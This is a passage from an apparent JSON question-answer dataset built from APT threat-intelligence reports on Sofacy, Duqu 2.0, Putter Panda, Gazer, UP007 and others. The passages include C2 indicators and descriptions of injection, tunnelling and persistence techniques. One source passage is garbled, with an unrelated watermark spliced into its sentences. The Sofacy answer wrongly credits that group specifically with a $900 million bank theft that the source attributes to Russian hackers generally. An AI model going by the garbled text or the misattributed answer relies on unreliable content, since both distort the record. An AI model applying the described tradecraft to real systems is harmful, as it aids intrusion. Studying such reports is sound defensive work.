    "instruction": "Medium Headline: ROOT9B RELEASES ZERO DAY HASHES\nCybersecurity experts are increasingly concerned about the threat posed by Russian hacking groups. Besides well-known events such as the attacks against Estonia, Georgia, and Ukraine; recent headlines have seen Russian hacking syndicates credited with targeting NATO officials at conferences, stealing hundreds of millions from banks, and successfully penetrating the White House unclassified computer network. The increase in cyber-exploits is also accompanied by a much more aggressive Russian foreign policy, which has seen them invade Ukraine and literally seize control of sovereign territory in Crimea.  So it should not surprise anyone that just as nuclear capable Russian bombers are increasingly penetrating foreign airspace, their cyber-warriors appear to be ramping up their intrusions as well. But this time, perhaps for the first time, root9B has managed to find where they were hiding and identified effective defenses against their intended attacks. This is what happened in late April and early May of this year.\nOur firm of cybersecurity experts, staffed by veterans from the United States Department of Defense, identified suspicious activity within one of our client's networks; a threat which on closer inspection bore the unique signature of a group of Russian hackers well-known in the cyber-security\nindustry. As Cyber Threat analysts continued to follow the indicators, they uncovered a global attack in the making, and took steps to protect not only our clients, but other identified victims as well.\nSofacy, Sednit, Sourface, APT-28, and a host of other names are all used to describe this particularly prolific and superbly talented group of Russian hackers, which has strongly suspected ties to Russian intelligence services.   In the last year alone Russian hackers have reportedly stolen up to 900 million dollars from banks around the world.  Over the past three to five years they have built the largest botnets ever discovered, and stolen the log-in and password credentials to literally\ntens of millions of online accounts. Well known for their ability to infiltrate and remain undiscovered in networks for long periods of time, they may be the most successful group of hackers in the world. Whereas previous attacks have been attributed and analyzed only after they have run their course, this was the first and only known Sofacy attack to be discovered, identified, and reported \u2013 all before it could even begin!  The analysts and tools that enabled this to happen are unique and proprietary. This report documents the first ever operation to use threat intelligence and adversary tactics to discover and reveal the prepositioning of Sofacy zero-day malware. This document also includes the reporting of previously unknown malware  indicators and hashes.\nQuestion: What makes the Sofacy group (APT-28) particularly notable among other hacking groups, and how have their activities evolved over the past few years?",
    "output": "Answer: The Sofacy group, also known by various names such as Sednit, Sourface, and APT-28, is notable for its prolific and highly skilled activities, with strong suspected ties to Russian intelligence services. They are well-known for their ability to infiltrate and remain undetected in networks for extended periods. Over the past three to five years, they have reportedly stolen up to 900 million dollars from banks worldwide, built the largest botnets ever discovered, and stolen login and password credentials for tens of millions of online accounts. Their activities have evolved to include high-profile targets such as NATO officials, banks, and even the White House unclassified computer network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: PERSISTENCE MECHANISM\nThe Duqu 2.0 malware platform was designed in a way that survives almost exclusively in memory of the infected systems, without need for persistence. To achieve this, the attackers infect servers with high uptime and then re-infect any machines in the domain that get disinfected by reboots. Surviving exclusively in memory while running kernel level code through exploits is a testimony to the technical prowess of the group. In essence, the attackers were confident enough they can survive within an entire network of compromised computers without relying on any persistence mechanism at all.\nThe reason why there is no persistence with Duqu 2.0 is probably because the attackers wanted to stay under the radar as much as possible. Most modern anti-APT technologies can pinpoint anomalies on the disk, such as rare drivers, unsigned programs or maliciously-acting programs. Additionally, a system where the malware survives reboot can be imaged and then analyzed thoroughly at a later time. With Duqu 2.0, forensic analysis of infected systems is extremely difficult \u2013 one needs to grab memory snapshots of infected machines and then identify the infection in memory.\nHowever, this mechanism has one weakness; in case of a massive power failure, all computers will reboot and the malware will be eradicated. To get around this problem, the attackers have another solution \u2013 they deploy drivers to a small number of computers, with direct Internet connectivity. These drivers can tunnel traffic from the outside into the network, allowing the attackers to access remote desktop sessions or to connect to servers inside the domain by using previously acquired credentials. Using these credentials, they can re-deploy the entire platform following a massive power loss.\nBig Headline: COMMAND AND CONTROL MECHANISMS\nDuqu 2.0 uses a sophisticated and highly flexible command-and-control mechanism that builds on top of the 2011 variant, with new features that appear to have been inspired by other top class malware such as Regin. This includes the usage of network pipes and mailslots, raw filtering of network traffic and masking C&C traffic inside image files.\nInside a Windows LAN, newly infected clients may not have a C&C hardcoded in their installation MSI packages. Without a C&C, they are in \"dormant\" state and can be activated by the attackers over SMB network pipes with a special TCP/IP packet that contains the magic string \"tttttttttttttttt\". If a C&C is included in the configuration part of the MSI file, this can be either a local IP address, which serves as a bouncing point or an external IP address. As a general strategy for infection, the attackers identify servers with high uptime and set them as intermediary C&C points. Hence, an infected machine can jump between several internal servers in the LAN before reaching out to the Internet.\nTo connect the the C&C servers, both 2011 and 2014/2015 versions of Duqu can hide the traffic as encrypted data appended to a harmless image file. The 2011 version used a JPEG file for this; the new version can use either a GIF file or a JPEG file. Here's how these image files look like:\nAnother modification to the 2014/2015 variants is the addition of multiple user agent strings for the HTTP communication. The 2011 used the following user agent string:\n\u2022 Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)\nThe new variants will randomly select an user agent string from a table of 53 different possible ones.\nAnother unusual C&C mechanism relies on driver files that are used to tunnel the C&C communications and attacker's RDP/SMB activity into the network. The attackers deploy such translation drivers on servers with direct Internet connectivity. Through a knocking mechanism, the attackers can activate the translation mechanism for their IPs and tunnel their traffic directly into the LAN. Outside the LAN, the traffic can be masked over port 443; inside the LAN, it can be either direct SMB/RDP or it can be further translated over fake TCP/IP packets to IP 8.8.8.8.\nDuring our investigation, we observed several such drivers. A description can be found below.\nMedium Headline: The \"portserv.sys\" driver analysis\nMD5: 2751e4b50a08eb11a84d03f8eb580a4e\nSize: 14336\nCompiled: Sat Feb 11 21:55:30 2006 (fake timestamp)\nInternal name: termport.sys\nType: Win32 device driver (a 64 bit version is known as well)\nThis is a malicious NDIS filter driver designed to perform manipulation of TCP/IP packets to allow the attacker to access internal servers in the victim's infrastructure.\nUpon startup, the filter driver hooks into the NDIS stack and starts processing TCP/IP packets.\nTo leverage the driver, the attacker first sends a special TCP/IP packet with the string \"romanian.antihacker\" to any of the hardcoded IPs belonging to infected server. In general, such servers are computers with direct Internet connectivity, such as a webserver or a proxy. The driver sees the packet, recognizes the magic string \"romanian. antihacker\" and saves the attacker's IP for later use.\nMagic string used for knocking inside the driver.\nWhen a packet comes from the attacker's IP (saved before), the following logic applies:\n\u2022 Packet to server 1's IP on port 443, is redirected on port 445 (Samba/Windows file system)\n\u2022 Packet from server 1's IP from port 445, is redirected to attacker's IP port 443\n\u2022 Packet to server 2's IP on port 443 is redirected on port 3389 (Remote Desktop)\n\u2022 Packet from server 2's IP from port 3389 is redirected to attacker's IP port 443\nThis effectively allows the attackers to tunnel SMB (remote file system access) and Remote Desktop into these two servers while making it look like SSL traffic (port 443).\nThese drivers allow the Duqu attackers to easily access servers inside the LAN from remote, including tunneling RDP sessions over Port 443 (normally SSL). It also gives them a persistence mechanism that allows them to return even if all the infected machines with the malware in memory are rebooted. The attackers can simply use existing credentials to log back into any of the servers that the driver is serving and can reinitialize the backdoors from there.\n\nHow does the command and control (C&C) mechanism of Duqu 2.0 differ from its 2011 variant, and what new features were inspired by other top-class malware like Regin?",
    "output": "The C&C mechanism of Duqu 2.0 builds on the 2011 variant with new features inspired by other top-class malware like Regin. These features include the usage of network pipes and mailslots, raw filtering of network traffic, and masking C&C traffic inside image files. Unlike the 2011 version, which used only JPEG files, the 2014/2015 version can use either GIF or JPEG files. Additionally, the new variants randomly select a user agent string from a table of 53 different possibilities for HTTP communication, whereas the 2011 version used a single user agent string.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nCat Scratch Fever: CrowdStrike Tracks Newly Reported Iranian Actor as FLYING KITTEN\nToday, our friends at FireEye released a (<http://www.fireeye.com/resources/pdfs/fireeye-operation-saffron-rose.pdf>)report on an Iran-based adversary they are calling Saffron Rose. CrowdStrike Intelligence has also been tracking and reporting internally on this threat group since mid-January 2014 under the name FLYING KITTEN, and since that time has seen targeting of multiple U.S.-based defense contractors as well as political dissidents.\n\nHow did CrowdStrike's tracking of the Iranian actor FLYING KITTEN differ from FireEye's report on Saffron Rose, and what were the primary targets of FLYING KITTEN's operations?",
    "output": "CrowdStrike's tracking of the Iranian actor FLYING KITTEN was similar to FireEye's report on Saffron Rose, but CrowdStrike had been tracking and reporting internally on this threat group since mid-January 2014. The primary targets of FLYING KITTEN's operations included multiple U.S.-based defense contractors as well as political dissidents.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does Uroburos utilize third-party tools to facilitate its operations, and what specific tools were found in its virtual file system?",
    "output": "Uroburos utilizes third-party tools to enhance its post-exploitation capabilities. Specifically, it employs a variety of tools to gather information, steal data, and compromise additional systems within the target infrastructure. Some of the notable tools found in its virtual file system include a dumper for NTLM hashes, which can be used to perform 'pass the hash' attacks to compromise new systems; information gathering tools to collect details about the infected system; RAR tools to create archives of stolen documents; and a Microsoft Office document stealer. These tools enable Uroburos to efficiently exfiltrate sensitive data and expand its control over the compromised environment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: UP007 Command and Control Infrastructure\nThe command and control server for the UP007 sample is hosted on Hong Kong provider New World Telecom at the IP address 59.188.12[.]123. Passive DNS data from (<https://www.passivetotal.org/>)PassiveTotal indicates that the domain name yeaton.xicp[.]net pointed to this IP from January 8 2016 to March 19 2016. In their (<https://www.arbornetworks.com/blog/asert/four-element-sword-engagement>)recent report ASERT notes that the domain: yeaton.xicp[.]net was used to advertise a Chinese VPN service in 2012. However, as (<https://www.arbornetworks.com/blog/asert/four-element-sword-engagement>)ASERT explains given the long period between the use of the domain for advertising and the recent threat activity the past uses of the domain may not be related to the threat actors.\nBig Headline: UP007 Samples and Variations\nIn November 2013, an exploit document (MD5: (<https://virustotal.com/en/file/ef97f13f49266a170f4d334482376bb31335fc323ed80917b9943207ff75f750/analysis/>)983333e2c878a62d95747c36748198f0) was uploaded to various malware sites with the filename \ue0cb\ue077\ue077\ue0b8\ue05a\ue037\ue075\ue008\ue03b\ue00e\ue07e\ue09a\ue0a5\ue055\ue0a9\ue008\ue08b\ue06f \ue0a5\ue066.docx(which translates to \"Chinese National Security Council's Institutional Structure and Member list\") and 131106 minutes.docx. Instead of receiving the Stage 2 binary in the C2 protocol as in the recent UP007 sample, the November 2013 sample directly requested ok.exevia an HTTP GET request to 103.19.85[.]89. The ok.exe sample communicated with tenday.mysecondarydns[.]com which resolved to 103.19.85[.]89. It was signed with a certificate with serial number 04 DE 6E CB 4B A2 A5 54 2B 5E 0C 71 EE FD 2A AA.\nOne year later, in November 2014, another instance of the UP007 dropper (MD5: (<https://virustotal.com/en/file/fffcd925236e3fa5dce4645b792487add293bbca7117a91cba7c5035ff1c3db0/analysis/>)e2ac89b5c820fc598b92a635a7d8bc33) signed with a certificate using the serial number 3A 72 A8 34 FB EC E5 4F A5 E5 2F 67 BA 63 4D CA was uploaded to VirusTotal. According to VirusTotal, this file was observed being hosted at http://103.19.85[.]89/chin.jpg. The final payload was designed to communicate with the same host for command and control.\nIn August 2015, an instance of the UP007 dropper (MD5: (<https://virustotal.com/en/file/b748b61ff6c3ea0c64f2359c44e022c629378aab6d7377e64c6ad0dcc5f78746/analysis/>)639c7239f40d95f677a99abb059e8338) signed with the same certificate (Serial: 5D 11 78 4F B8 17 65 02 3F 89 A4 F4 24 3F E1 A9) as fzyy.exe was uploaded to VirusTotal spotted in the wild as http://hkemail.f3322[.]org/32.zip. This sample communicated with hk2[.]upupdate[.]cn which resolved to 103.27.108[.]122 at the time of analysis.\nThe samples detailed in Table 4 were identified by import hash and other structural similarities related to the UP007 dropper. They were uploaded to VirusTotal by the same submitter on November 14, 2014 and February 27, 2015. They were signed with the same 3A 72...4D CA and 5D 11...E1 A9 certificates, respectively.\nThe RAR archive detailed in Table 5 reportedly drops the same files responsible for loading the UP007 sample. It also (<http://a.virscan.org/19866e7566373028799abd6844ac16d1>)reportedly communicates with 59.188.12[.]123. We have not been able to obtain this sample directly.\n\nWhat role do digital certificates play in the deployment and operation of the UP007 malware? How can this information be used to track and attribute the activities of the threat actors involved?",
    "output": "Digital certificates play a significant role in the deployment and operation of the UP007 malware. Different samples of the malware have been signed with specific certificates, allowing researchers to track and correlate various instances of the malware. For example, a sample from November 2014 was signed with a certificate with the serial number 3A 72 A8 34 FB EC E5 4F A5 E5 2F 67 BA 63 4D CA, while another sample from August 2015 used the certificate with the serial number 5D 11 78 4F B8 17 65 02 3F 89 A4 F4 24 3F E1 A9. By tracking these certificates, security professionals can identify patterns and potentially attribute the activities to specific threat actors, enhancing their ability to monitor and respond to ongoing campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: PnGdoWnEr \u2013 EXaMPlE Md5 HasH 687424F0923dF9049CC3a56C685EB9a5\nthe pngdowner malware is a simple tool constructed using Microsoft Visual studio and implemented via single C++ source code file. this sample contains a PdB path of Y:\\Visual studio 2005\\Projects\\branch-downer\\ downer\\release\\downer.pdb, but other similar paths Z:\\Visual studio 2005\\Projects\\pngdowner\\release\\ pngdowner.pdb and Z:\\Visual studio 2005\\Projects\\downer\\release\\downer.pdb have also been observed in other samples. appendix 3 lists metadata for known pngdowner samples.\nInitially, the malware will perform a connectivity check to a hard-coded Url (http://www.microsoft.com), using a constant user agent Mozilla/4.0 (Compatible; MsIE 6.0;). If this request fails, the malware will attempt to extract proxy details and credentials from Windows Protected storage, and from the IE Credentials store using publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HttP access. an initial request is then made to the hard-coded C2 server and initial UrI \u2013 forming a Url of the form (in this sample) http://login.stream-media.net/files/xx11/index.asp?95027775, where the numerical parameter screenshot of truecaller represents a random integer. a hard-coded user agent of myagent is used for this request, and subsequent communication with the C2 server. Database shared by  DEaDEyE JacKaL on their twitter account (names redacted) Content returned from this request to the C2 server will be saved to a file named index.dat in the user's temporary directory (i.e., %tEMP%). this file is expected to contain a single line, specifying a Url and a filename. the malware will then attempt to download content from the specified Url to the filename within the user's temporary directory, and then execute this file via the WinExec aPI. If this execution attempt succeeds, a final C2 request will be made \u2013 in this case to a Url using the same path as the initial request (and a similarly random parameter), but with a filename of success.asp. Content returned from this request will be saved to a file, but then immediately deleted. Finally, the malware will delete the content saved from the first request, and exit.\nthe limited functionality, and lack of persistence of this tool, implies that it is used only as a simple download-and-execute utility. although the version mentioned here uses C++, along with Visual studios standard template library (stl), older versions of the rat (such as Md5 hash b54e91c234ec0e739ce429f47a317313), built in 2011, use plain C. this suggests that despite the simple nature of the tool, the developers have made some attempts to modify and perhaps modernize the code. Both versions contain debugging/progress messages such as \"down file success\". although these are not displayed to the victim, they were likely used by the developers as a simple means to verify functionality of their code.\nSmall Headline: HttPClIEnt \u2013 EXaMPlE Md5 HasH 544FCa6EB8181F163E2768C81F2Ba0B3\nlike pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses HttP for its C2 channel. this malware also initially performs a connectivity check to www.microsoft.com using the hard-coded user agent Mozilla/4.0 (Compatible; MsIE 6.0;), although in this variant no attempt is made to extract proxy credentials.\nthe malware will then connect to its configured C2 infrastructure (file.anyoffice.info) and perform a HttP request of the form shown in Figure 14 below:\nContent returned from the C2 server is deobfuscated by Xor'ing the content with a single byte, 0x12. the decoded data is then checked for the string runshell. If this string is not present, the C2 request is repeated every 0.5 seconds. otherwise, a shell process is started (i.e., cmd.exe), with input/output redirected over the C2 channel. shell commands from the server are followed by an encoded string $$$, which indicates that the shell session should continue. If the session is ended, two other commands are supported: m2b (upload file) and b2m (download file).\nslight variations on the C2 Urls are used for different phases of the C2 interaction:\n\u2022 shell command: /Microsoft/errorpost<random number>/default.asp?tmp=<encoded hostname>\n\u2022 Shell response: /MicrosoftUpdate/GetUpdate/KB<random number>/default.asp?tmp=<encoded hostname>\n15Both methods are detailed here: http://securityxploded.com/iepasswordsecrets.php\nGiven the lack of a persistence mechanism and low level of sophistication, it is likely that httpclient \u2013 like pngdowner \u2013 is used as a second-stage or supplementary/backup tool. appendix 4 lists metadata for observed httpclient samples.\nSmall Headline: droPPErs \u2013 rC4 and Xor BasEd\nother Crowdstrike reporting describes a dropper used by PUttEr Panda (abc.scr) to install the 4H rat. this dropper uses rC4 to decrypt an embedded payload from data in an embedded resource before writing the payload to disk and executing it. several instances of this dropper have been observed, most commonly in association with the 4H rat, but also in relation to other tools that will be described in forthcoming reporting. another dropper has been observed, exclusively installing the pngdowner malware (example Md5 hash 4c50457c35e2033b3a03fcbb4adac7b7). this dropper is simplistic in nature, and is compiled from a single C++ source code file. It contains a Word document in plaintext (written to Bienvenue_a_sahaja_Yoga_toulouse. doc), along with an executable (Update.exe) and dll (McUpdate.dll). the executable and dll are both contained within the .data section of the dropper, obfuscated with a 16-byte Xor key (consisting of the bytes 0xa0 \u2013 0xaF). screenshot of truecaller\nDatabase shared by\nDEaDEyE JacKaL on their Both the document and executable are written to disk and the executed via the shellExecute aPI (using the twitter account (names redacted) verb \"open\"). the executable is also installed into the asEP registry key HKCU\\software\\Microsoft\\Windows\\ CurrentVersion\\run, with a value named McUpdate. Finally, the dropper deletes itself via a batch file. the dropped executable (Md5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject the specified dll (McUpdate.dll, Md5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that would normally be accessing the network, likely in order to disguise the malicious activity. Module names corresponding to outlook Express (msinm.exe), outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe) are used. If Internet Explorer is used, then the malware will attempt to terminate processes corresponding to two components of sophos anti-Virus (saVadminservice.exe and savservice.exe). Four examples of these droppers were located, using a mixture of decoy PdF and Microsoft Word documents (shown below in Figures 15-18). the common theme throughout these documents is space technology (Bienvenue_a_sahaja_Yoga_toulouse.doc does not follow this trend, but could be targeted at workers at the toulouse space Centre, the \"largest space centre in Europe\" ), indicating that the attackers have a keen interest in this sector, which is also reflected in the choice of name for some of the C2 domains used (see the attribution section above).\n16The API used expects a parameter of the form char**, and is given a char* pointer to the \"*/*\" string, but the stack data following this pointer is not properly zeroed or cleansed before use, leading to uncontrolled memory being read as other strings.\nFigure 15. \"In-vitation_Pleia-des_012012.doc\" dropped by a4e4b-3ceb949e8494968c-71fa840a516\nruecaller\nDatabase shared by\nFigure 17. \"50th aIaa satellite sciences Conference.pdf\" from 6022cf1fcf2b478bed8da1fa3e996ac5\nscreenshot of truecaller Database shared by  DEaDEyE JacKaL on their\nMedium Headline: concLusion\nPUttEr Panda are a determined adversary group who have been operating for several years, conducting intelligence-gathering operations with a significant focus on the space sector. although some of their tools are simplistic, taken as a whole their toolset provides a wide degree of control over a victim system and can provide the opportunity to deploy additional tools at will.\nresearch presented in this report shows that the PUttEr Panda operators are screenshot of truecaller likely members of the 12th Bureau, 3rd General staff department (Gsd) of Database shared by  the People's liberation army (Pla), operating from the unit's headquarters DEaDEyE JacKaL on their twitter account (names redacted) in shanghai with MUCd 61486. strategic objectives for this unit are likely to include obtaining intellectual property and industrial secrets relating to defense technology, particularly those to help enable the unit's suspect mission to conduct space surveillance, remote sensing, and interception of satellite communications. PUttEr Panda is likely to continue to aggressively target Western entities that hold valuable information or intellectual property relevant to these interests.\nthe detection and mitigation guidance given in this report will help to minimize the risk of a successful compromise by these actors, and future Crowdstrike reports will examine other elements of the PUttEr Panda toolset.\n\nQ: What are the strategic objectives of the Putter Panda group, and how do their tools and targets align with these objectives?",
    "output": "A: The strategic objectives of the Putter Panda group likely include obtaining intellectual property and industrial secrets relating to defense technology, particularly those relevant to space surveillance, remote sensing, and interception of satellite communications. Their tools, while sometimes simplistic, provide a wide degree of control over victim systems and allow for the deployment of additional tools. The group has a significant focus on the space sector, as evidenced by their targeting of space technology companies and the choice of C2 domain names related to space technology.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SImIlarITIeS wITh oTher Turla ToolS\nGazer is written in C++ and shares several similarities with other malware from the Turla APT family. Indeed, Gazer, Carbon and Kazuar can receive encrypted tasks from a C&C server, which can be executed either by the infected machine or by another machine on the network. They all use an encrypted container to store the malware's components and configuration and they also log their actions  in a file.\nThe list of C&C servers is encrypted and embedded in Gazer's PE resources. They are all compromised, legitimate websites (that mostly use the WordPress CMS) that act as a first layer proxy. This is also  a common tactic for the Turla APT group.\nAnother interesting linkage is that one of the C&C servers embedded in a Gazer sample was known  to be used in a JScript backdoor documented by Kaspersky as Kopiluak.\nLast but not least, these three malware families (Gazer, Carbon and Kazuar) have a similar list  of processes that may be employed as a target to inject the module used to communicate with the C&C server embedded in the binary. The resource containing this list can change from one sample  to another, it is likely tailored to what is installed on the system (for example, on some samples, the process name \"safari.exe\" can appear on the list).\nBig Headline: CuSTom enCrypTIon\nGazer's authors make extensive use of encryption. They don't use the Windows Crypto API  and don't seem to use any public library. It looks as if they are using their own library for 3DES and RSA.\nThe RSA keys embedded in the resources contains the attacker's public key which is used to encrypt the data sent to the C&C server, and a private key to decrypt resources embedded in its binaries. These keys are unique in each sample.\nThese resources are structured in the same way as (<https://wiki.openssl.org/index.php/Manual:Rsa(3)>)RSA from OpenSSL, but these values (p, q, etc.)  are computed by the custom implementation of Gazer's authors.\nFor 3DES, the IV and a static key are hardcoded and are the same in all samples. This 3DES key  is randomly generated and XORed with the static key. The random data used to XOR the static  key is prepended to the logfile header. This key is then used in the regular 3DES algorithm.\nSmall Headline: Named pipe generation\nTo establish a communication channel between Gazer components, a named pipe is initiated.\nThe named pipe is generated from this string:\n\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-FFFF-F\n1 Note that in all samples we have analyzed the process name is \"explorer.exe\"\nThe pattern \"FFFF-F\" is replaced with values computed from the security identifier (SID) of the current user and the current timestamp.\nLet's take for example the current date as: \"2017/04/24\" and the SID: \"S-1-5-21-84813077-3085987743-2510664113-1000\".\nTo generate the pattern at the end of the named pipe, some arithmetic is performed:\nIn this case, the named pipe will be:\n\\\\\\\\.\\\\pipe\\\\Winsock2\\\\CatalogChangeListener-9313-a\nIf the current user's SID cannot be retrieved, the named pipe \\\\\\\\.\\\\pipe\\\\\\Winsock2\\\\ CatalogChangeListener-FFFE-D will be used by default.\nSmall Headline: Code injection through thread hijacking\nA not-so-common trick is used in order to inject the orchestrator into a remote process. Indeed, a running thread from the remote process is hijacked in order to run shellcode that will execute  the communication module entry point.\n\u2022 The whole module and shellcode are copied into the remote process;\n\u2022 the function ZwQuerySystemInformation is used to retrieve the total number  of the running threads in the targeted process;\n\u2022 the following operations are attempted on each of those threads:\n\u2022 the thread is suspended with the OpenThread/SuspendThread functions;\n\u2022 the thread context is retrieved using GetThreadContext;\n\u2022 the context's instruction pointer is saved and modified to point to the shellcode  (through SetThreadContext);\n\u2022 the thread is resumed using ResumeThread.\n\u2022 if one of the previous operations fails, the thread is resumed and the same actions  are attempted on another thread.\nThe shellcode is just a loader that will execute the module entry point in a new thread.\nSmall Headline: Persistence\nThe loader sends binary data through the named pipe to the orchestrator. This blob contains:\n\u2022 a command ID (2): CMC_TAKE_LOADER_BODY\n\u2022 the loader path file\n\u2022 the loader PE\nOnce this message is received by the orchestrator, the loader is securely deleted by overwriting  the file content and deleted through the DeleteFile function.\nAfterwards, the persistency is set up. The persistency information is retrieved from the resource \"105\" and stored in the Gazer storage. Among these data, there is a dword value that is used to choose which persistency mode will be applied.\nThe resource 105 is structured in the following way:\n\u2022 a dword value representing the persistence mode\n\u2022 a dword value representing the size of the data\n\u2022 the persistence information\nThere are 6 different persistence modes.\nVery Small Headline: 2: ScreenSaverAutorun\nIn this mode, Gazer achieves persistency by setting up in the Windows registry the executable  file used for the screensaver.\nMany values are created under the HKCU\\Control Panel\\Desktop registry key:\n\u2022 SCRNSAVE.exe with the malware executable path\n\u2022 ScreenSaveActive is set to \"1\": enable the screensaver\n\u2022 ScreenSaverIsSecure is set to \"0\": specifies that the screensaver is not password-protected\n\u2022 ScreenSaveTimeout is set to a value given in the resource. It specifies how long the system remains idle before the screensaver (in this case: the malware) starts.\nVery Small Headline: 4: TaskSchedulerAutorun\nThis method is used to achieve persistence by creating a scheduled task.\nThe task is created and set up through COM interfaces related to tasks (ITaskService, ITaskSettings, \u2026).\nSome information such as the task name and its description is retrieved from the resource. For example, in one of the sample's resources, the persistency mode is set to 04 (TaskSchedulerAutorun) with the persistency data:\n%APPDATA%\\Adobe\\adobeup.exe Adobe Acrobat Reader Updater. This task was generated by Adobe Systems, Inc to keep your Adobe Software up-to-data. \\Adobe\\AcrobatReader.Adobe\nIn this example, a scheduled task will be created and set up thus:\n\u2022 Task name: \"Adobe Acrobat Reader Updater\"\n\u2022 Executable: \"%APPDATA%\\Adobe\\adobeup.exe\"\n\u2022 The orchestrator will copy the loader received through the named pipe to this location\n\u2022 Task description: \"This task was generated by Adobe Systems, Inc to keep your Adobe Software up-to-data\"\n\u2022 Task folder: \"\\Adobe\\AcrobatReader.Adobe\"\nLast but not least, the task is configured to be started by the task scheduler at any time after  its scheduled time has passed. The task will be triggered when the current user logs on.\nMedium Headline: Logs\nAll three Gazer components log their actions into logfiles. They are encrypted with the same algorithm: 3DES.\nIn some versions of Gazer, it is easy to retrieve these logfiles because their filenames are hardcoded into the binaries:\n\u2022 %TEMP%\\CVRG72B5.tmp.cvr: the logs from the loader\n\u2022 %TEMP%\\CVRG1A6B.tmp.cvr: the logs from the orchestrator\n\u2022 %TEMP%\\CVRG38D9.tmp.cvr: the logs from the communication module\nEach logfile is structured in the following way:\n\u2022 [LOGSIZE][DECRYPTION_KEY][ENCRYPTED_LOG]\n\u2022 logsize: when this value (2 bytes) is subtracted from the magic value 0xf18b, it gives  the encrypted log size\n\u2022 decryption_key: when this 12 bytes blob is XORed with another hardcoded key of 12 bytes, it gives the 3DES key that can be used to decrypt the log\n\u2022 encrypted_log: log encrypted with the 3DES algorithm in CBC mode\nOnce decrypted, each log entry is formatted in the following way:\n|Hour:Min:Sec:Ms| [log ID] [log]\nHere is an example with the decrypted orchestrator logfile:\nNote that in older Gazer versions, the \"log ID\" was replaced by the name of the current function. We believe that this log ID is an ID for the function where the log occurs.\nSmall Headline: Using the Windows Registry\nAll the files related to Gazer (except the logs) are stored encrypted within the registry. The orchestrator's resource \"109\" contains the root storage path (it will be designated %RootStoragePath% in the rest  of this paper). In every sample we examined, this resource pointed to the same storage path:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ScreenSaver\nIf this resource is empty, the registry key above is used by default. Except for RSA keys, all the data  in the storage is encrypted2.\nSeveral subdirectories (whose names are hardcoded in the binary) are created.\n\u2022 %RootStoragePath%{119D263D-68FC-1942-3CA3-46B23FA652A0}\n\u2022 Object ID: a unique ID to identify the victim\n\u2022 %RootStoragePath%{1DC12691-2B24-2265-435D-735D3B118A70}\n\u2022 Task Queue: linked list of tasks to be executed\n\u2022 %RootStoragePath%{28E74BDA-4327-31B0-17B9-56A66A818C1D}\n\u2022 Plugins\n\u2022 %RootStoragePath%{31AC34A1-2DE2-36AC-1F6E-86F43772841F}\n\u2022 Communication Module: the DLL that communicates with the C&C server\n\u2022 %RootStoragePath%{3CDC155D-398A-646E-1021-23047D9B4366}\n\u2022 Autorun: the persistency method\n\u2022 %RootStoragePath%{4A3130BD-2608-730F-31A7-86D16CE66100}\n\u2022 Local Transport Settings: the computers IPs that are on the same network\n\u2022 %RootStoragePath%{56594FEA-5774-746D-4496-6361266C40D0}\n\u2022 Last Connection: last connection time with the C&C server (structure SYSTEMTIME)\n\u2022 %RootStoragePath%{629336E3-58D6-633B-5182-576588CF702A}\n\u2022 RSA Private Key: generated on the fly; used to decrypt the data from Gazer storage.\n\u2022 %RootStoragePath%{6CEE6FE1-10A2-4C33-7E7F-855A51733C77}\n\u2022 Result Queue: linked list of the tasks results\n\u2022 %RootStoragePath%{81A03BF8-60AA-4A56-253C-449121D61CAF}\n\u2022 Inject Settings: the list of processes to use to try to inject the communications module\n\u2022 %RootStoragePath%{8E9810C5-3014-4678-27EE-3B7A7AC346AF}\n\u2022 C&C servers\n2  See the \"Gazer Resources\" section for details\n\nQ: What are the similarities between Gazer, Carbon, and Kazuar in terms of their functionality and how they interact with C&C servers?",
    "output": "A: Gazer, Carbon, and Kazuar share several similarities in their functionality. All three can receive encrypted tasks from a C&C server, which can be executed either by the infected machine or by another machine on the network. They use an encrypted container to store the malware's components and configuration and log their actions in a file. Additionally, they have a similar list of processes that may be employed as a target to inject the module used to communicate with the C&C server embedded in the binary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Introduction\nGh0st Rat is a well-known Chinese remote access trojan which was originally made by C.Rufus Security Team several years ago. Just as with other well-featured \"off-the-shelf\" trojans like Poison Ivy, Hupigon and DarkComet it has been used by all sorts of people \u2013 from the script kiddie next door to resourceful targeted attack actors (1)\nCybercriminals use off-the-shelf malware not only because it's easy and cheap. They also use it because it's hard to track. Anybody could use this malware, so the criminal could be anybody. However, this changes somewhat when they start modifying the code. The malware now becomes somewhat attributable and can be connected to known cases and criminal groups.  This document is the result of examining selected common traits between some 1200+ Gh0st Rat program files (samples) with the help of Maltego, a tool to visualize data connections. The samples were processed by us in a timeframe of approximately six months, from August 2011 to February 2012.\nIn this study we attempt to map out what logical connections do exist between different Gh0st botnet campaigns. This is important because it gives an indication of the scale of operation and sometimes what the aims of the campaigns are, and this can be valuable for risk analysis. Additional data produced by the study may be used for risk mitigation.\n\nQuestion: How does the modification of off-the-shelf malware like Gh0st RAT affect its attribution and tracking? Why might cybercriminals choose to modify such malware despite the potential risks?\n\nAnswer:",
